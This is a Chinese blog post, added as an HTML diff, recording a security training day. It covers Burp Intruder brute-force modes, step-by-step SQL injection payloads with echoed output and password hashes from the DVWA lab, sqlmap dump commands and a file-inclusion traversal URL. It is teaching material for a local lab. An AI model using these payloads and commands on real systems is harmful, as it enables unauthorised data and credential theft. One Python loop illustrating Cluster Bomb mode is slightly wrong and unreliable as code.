@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"got17.cn","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="上午讲burpsuite的暴力破解模块，四种攻击模式。完事安装kali。 下午SQL注入，手工和sqlmap都有介绍，最后剩一点时间简单讲了点文件包含漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【网络安全1x02】安恒厂家网络安全培训 --- day2">
+<meta property="og:url" content="http://got17.cn/1072/index.html">
+<meta property="og:site_name" content="gaoteng&#39;s blog">
+<meta property="og:description" content="上午讲burpsuite的暴力破解模块，四种攻击模式。完事安装kali。 下午SQL注入，手工和sqlmap都有介绍，最后剩一点时间简单讲了点文件包含漏洞。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-06-30T15:55:08.000Z">
+<meta property="article:modified_time" content="2022-09-03T03:28:56.678Z">
+<meta property="article:author" content="gaoteng17">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="burpsuite">
+<meta property="article:tag" content="kali">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://got17.cn/1072/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://got17.cn/1072/","path":"1072/","title":"【网络安全1x02】安恒厂家网络安全培训 --- day2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【网络安全1x02】安恒厂家网络安全培训 --- day2 | gaoteng's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">gaoteng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#burpsuite%E2%80%93Intruder"><span class="nav-number">1.</span> <span class="nav-text">burpsuite–Intruder</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sniper-%E7%8B%99%E5%87%BB"><span class="nav-number">1.1.</span> <span class="nav-text">Sniper (狙击)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Battering-ram-%E6%92%9E%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">Battering ram (撞击)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pitchfork-%E4%BA%A4%E5%8F%89"><span class="nav-number">1.3.</span> <span class="nav-text">Pitchfork (交叉)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cluster-Bomb-%E9%9B%86%E6%9D%9F%E7%82%B8%E5%BC%B9"><span class="nav-number">1.4.</span> <span class="nav-text">Cluster Bomb (集束炸弹)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kali"><span class="nav-number">2.</span> <span class="nav-text">kali</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E2%80%94low"><span class="nav-number">3.1.</span> <span class="nav-text">SQL注入漏洞—low</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap"><span class="nav-number">3.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">文件包含漏洞</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="gaoteng17"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">gaoteng17</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/gaoteng17" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gaoteng17" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:gaoteng17@gmail.com" title="E-Mail → mailto:gaoteng17@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/5544866728" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5544866728" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://got17.cn/1072/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="gaoteng17">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【网络安全1x02】安恒厂家网络安全培训 --- day2 | gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【网络安全1x02】安恒厂家网络安全培训 --- day2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-06-30 23:55:08" itemprop="dateCreated datePublished" datetime="2020-06-30T23:55:08+08:00">2020-06-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-03 11:28:56" itemprop="dateModified" datetime="2022-09-03T11:28:56+08:00">2022-09-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>上午讲burpsuite的暴力破解模块，四种攻击模式。完事安装kali。</p>
+<p>下午SQL注入，手工和sqlmap都有介绍，最后剩一点时间简单讲了点文件包含漏洞。</p>
+<span id="more"></span>
+
+<h1 id="burpsuite–Intruder"><a href="#burpsuite–Intruder" class="headerlink" title="burpsuite–Intruder"></a>burpsuite–Intruder</h1><p>抓包后右键Send to Intruder即可进行暴力破解，以下面这一段参数为例,被§§包围的部分(1)、(2)为需要破解的部分：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user=§user§&amp;password=§password§&amp;imageField.x=17&amp;imageField.y=1</span><br><span class="line">     (1)            (2)</span><br><span class="line">---------------------------------------------------------- </span><br><span class="line"> payload1 = [user1,user2,user3]</span><br><span class="line"> payload2 = [pass1,pass2,pass3]</span><br><span class="line">---------------------------------------------------------- </span><br></pre></td></tr></table></figure>
+
+<p>四种模式如下：</p>
+<h2 id="Sniper-狙击"><a href="#Sniper-狙击" class="headerlink" title="Sniper (狙击)"></a>Sniper (狙击)</h2><p>按顺序将(1)(2)其中之一中使用所给的payload进行替换，另一个参数不变。</p>
+<p>payload只能设置一个，若使用payload2的话，破解尝试顺序为：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>user(1)</th>
+<th>password(2)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>pass1</td>
+<td>password</td>
+</tr>
+<tr>
+<td>2</td>
+<td>pass2</td>
+<td>password</td>
+</tr>
+<tr>
+<td>3</td>
+<td>pass3</td>
+<td>password</td>
+</tr>
+<tr>
+<td>4</td>
+<td>user</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>5</td>
+<td>user</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>6</td>
+<td>user</td>
+<td>pass3</td>
+</tr>
+</tbody></table>
+<h2 id="Battering-ram-撞击"><a href="#Battering-ram-撞击" class="headerlink" title="Battering ram (撞击)"></a>Battering ram (撞击)</h2><p>使用payload同时替换所有被选中的位置。</p>
+<p>同样payload只能设置一个，使用payload2的话，破解尝试顺序为：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>user(1)</th>
+<th>password(2)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>pass1</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>pass2</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>3</td>
+<td>pass3</td>
+<td>pass3</td>
+</tr>
+</tbody></table>
+<h2 id="Pitchfork-交叉"><a href="#Pitchfork-交叉" class="headerlink" title="Pitchfork (交叉)"></a>Pitchfork (交叉)</h2><p>按顺序分别使用payload1替换(1)，payload2替换(2)，一一对应，payload数量较少的列表用完则停止。</p>
+<p>payload可设置(1~替换位)个，使用payload1、payload2的话，破解尝试顺序为：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>user(1)</th>
+<th>password(2)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>user1</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>user2</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>3</td>
+<td>user3</td>
+<td>pass3</td>
+</tr>
+</tbody></table>
+<p>破解方式python模拟代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>( <span class="built_in">min</span>(<span class="built_in">len</span>(payload1),<span class="built_in">len</span>(payload2)) ):</span><br><span class="line">    user = payload1[i]</span><br><span class="line">    password = payload2[i]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cluster-Bomb-集束炸弹"><a href="#Cluster-Bomb-集束炸弹" class="headerlink" title="Cluster Bomb (集束炸弹)"></a>Cluster Bomb (集束炸弹)</h2><p>通常意义上的穷举法。</p>
+<p>payload可设置(1~替换位)个，使用payload1、payload2的话，破解尝试顺序为：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>user(1)</th>
+<th>password(2)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>user1</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>user2</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>3</td>
+<td>user3</td>
+<td>pass1</td>
+</tr>
+<tr>
+<td>4</td>
+<td>user1</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>5</td>
+<td>user2</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>6</td>
+<td>user3</td>
+<td>pass2</td>
+</tr>
+<tr>
+<td>7</td>
+<td>user1</td>
+<td>pass3</td>
+</tr>
+<tr>
+<td>8</td>
+<td>user2</td>
+<td>pass3</td>
+</tr>
+<tr>
+<td>9</td>
+<td>user3</td>
+<td>pass3</td>
+</tr>
+</tbody></table>
+<p>破解方式python模拟代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload2:</span><br><span class="line">        user = payload1</span><br><span class="line">        password = payload2</span><br></pre></td></tr></table></figure>
+
+<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><p>之前装过了，虚拟机安装同理：</p>
+<p><a href="http://got17.cn/1010/">http://got17.cn/1010/</a></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入漏洞—low"><a href="#SQL注入漏洞—low" class="headerlink" title="SQL注入漏洞—low"></a>SQL注入漏洞—low</h2><ol>
+<li>判断注入类型</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>猜列数</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27; = &#x27;</span>a<span class="string">&#x27; order by 1 #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> #</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27; = &#x27;</span>a<span class="string">&#x27; order by ... #</span></span><br><span class="line"><span class="string">#二分查询(0~n)</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>获取字段顺序</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: 2</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>获取数据库名称</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,database() #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database() #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; union select 1,database() #</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: dvwa</span></span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>获取数据库中的表</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: guestbook,users</span></span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>查询表中字段名</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: user_id,first_name,last_name,user,password,avatar</span></span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>打印数据</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(user_id,first_name,last_name),group_concat(password) <span class="keyword">from</span> users #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: Gordon</span></span><br><span class="line"><span class="string">Surname: Brown</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(user_id,first_name,last_name),group_concat(password) <span class="keyword">from</span> users #</span><br><span class="line"><span class="keyword">First</span> name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: Pablo</span></span><br><span class="line"><span class="string">Surname: Picasso</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(user_id,first_name,last_name),group_concat(password) <span class="keyword">from</span> users #</span><br><span class="line"><span class="keyword">First</span> name: Bob</span><br><span class="line">Surname: Smith</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: 1adminadmin,2GordonBrown,3HackMe,4PabloPicasso,5BobSmith</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sql -u [url] 需要cookie，这里可以使用burpsuite抓一个包保存到本地sqlmap</span></span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt --dbs</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa --tables</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa -T <span class="built_in">users</span> --columns</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa -T <span class="built_in">users</span> -C <span class="string">&quot;user,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>
+
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=file1.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改?page=后文件目录</span></span><br><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=../../robots.txt</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+              <a href="/tags/burpsuite/" rel="tag"># burpsuite</a>
+              <a href="/tags/kali/" rel="tag"># kali</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/1070/" rel="prev" title="【网络安全2x01】上传漏洞靶场upload-labs（Pass01-04）">
+                  <i class="fa fa-chevron-left"></i> 【网络安全2x01】上传漏洞靶场upload-labs（Pass01-04）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/1073/" rel="next" title="【网络安全1x03】安恒厂家网络安全培训 --- day3">
+                  【网络安全1x03】安恒厂家网络安全培训 --- day3 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa-solid fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gaoteng17</span>
+</div>
+
+    </div>
+  </footer>
+
+  
